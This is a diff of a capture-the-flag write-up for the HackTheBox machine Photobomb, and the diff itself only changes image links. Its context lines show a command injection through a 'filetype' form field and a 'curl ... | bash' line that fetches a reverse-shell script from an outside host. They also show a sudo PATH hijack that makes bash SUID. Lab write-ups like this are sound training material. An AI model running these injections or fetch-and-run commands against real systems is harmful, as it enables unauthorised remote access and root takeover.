@@ -22,11 +22,11 @@ We have to add `photobomb.htb` to our `/etc/hosts` file to view port 80
 
 The webpage looks like a corporate page:
 
-![](<../../../.gitbook/assets/image%20(2653).png>)
+![](../../../.gitbook/assets/photobomb-4.png)
 
 When we click the link, it redirects us to some gallery.
 
-![](<../../../.gitbook/assets/image%20(2798).png>)
+![](../../../.gitbook/assets/photobomb-5.png)
 
 Since the page mentions there are credentials, we can view the page source to find `photobomb.js` containing some credentials:
 
@@ -42,7 +42,7 @@ window.onload = init;
 
 These credentials don't tell me anything new, so let's move on. At the bottom of the gallery, we can download images.
 
-![](<../../../.gitbook/assets/image%20(1409).png>)
+![](../../../.gitbook/assets/photobomb-2.png)
 
 Here's the request generated when we download a photo:
 
@@ -90,11 +90,11 @@ Upgrade-Insecure-Requests: 1
 photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;curl+10.10.14.13/rcecfm&dimensions=3000x2000
 ```
 
-![](<../../../.gitbook/assets/image%20(1899).png>)
+![](../../../.gitbook/assets/photobomb-3.png)
 
 With this, we can use `curl 10.10.14.13/shell.sh|bash` to get a reverse shell.
 
-![](<../../../.gitbook/assets/image%20(648).png>)
+![](../../../.gitbook/assets/photobomb-6.png)
 
 We can then grab the user flag from the home directory.
 
@@ -156,6 +156,6 @@ sudo PATH=$PWD:$PATH /opt/cleanup.sh
 
 This would make `/bin/bash` an SUID binary.
 
-![](<../../../.gitbook/assets/image%20(1068).png>)
+![](../../../.gitbook/assets/photobomb-1.png)
 
 Rooted!
